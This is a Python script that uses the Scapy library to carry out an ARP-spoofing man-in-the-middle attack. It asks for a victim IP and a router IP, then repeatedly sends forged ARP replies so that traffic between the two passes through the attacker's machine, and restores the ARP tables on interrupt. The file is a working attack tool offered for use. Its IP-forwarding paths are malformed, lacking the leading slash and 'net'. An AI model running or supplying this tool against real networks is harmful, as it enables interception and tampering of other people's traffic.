import os
import time
import sys
from scapy.all import *

def getInfo():
    interface = input("Interface (ifconfig/ipconfig to see):")
    victimIP = input("Victim IP:")
    routerIP = input("Router IP:")
    return [interface, victimIP, routerIP]

def get_MAC(ip, interface):
    #arp request to the victim to get what we need
    answer, unanswer = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, iface=interface, inter = 0.1)
    for send,recieve in answer:
        return recieve.sprintf(r"%Ether.src%")

def reARP(victimIP, routerIP, interface):

    victimMAC = get_MAC(victimIP, interface)

    routerMAC = get_MAC(routerIP, interface)

    #send 7 arp request to the router from the victimIP to the router in order to reset the arp table
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC, retry=7))

    #same but reverse
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC, retry=7))

    
    os.system("echo 0 > proc/sys/ipv4/ip_forward")
 
 
def attack(victimIP, victimMAC, routerIP, routerMAC):
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))  #tell the victim "I am the router"
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))  #tell the router "I am the victim"
 
 

def manInTheMiddle():
    
    info = getInfo() #list
    os.system("echo 1 > proc/sys/ipv4/ip_forward")

    try:
        victimMAC = get_MAC(info[1], info[0])
    except Exception:
        os.system("echo 0 > proc/sys/ipv4/ip_forward")
        sys.exit(1)
    try:
        routerMAC = get_MAC(info[2], info[0])
    except Exception:
        os.system("echo 0 > proc/sys/ipv4/ip_forward")
        sys.exit(1)

    print("Victim MAC: %s" % victimMAC)
    print("Router MAC: %s" % routerMAC)

    while True:
        try:
            attack(info[1], victimMAC, info[2], routerMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reARP(info[1], info[2], info[0])   #arp table rollback 
            break
    sys.exit(1)

manInTheMiddle()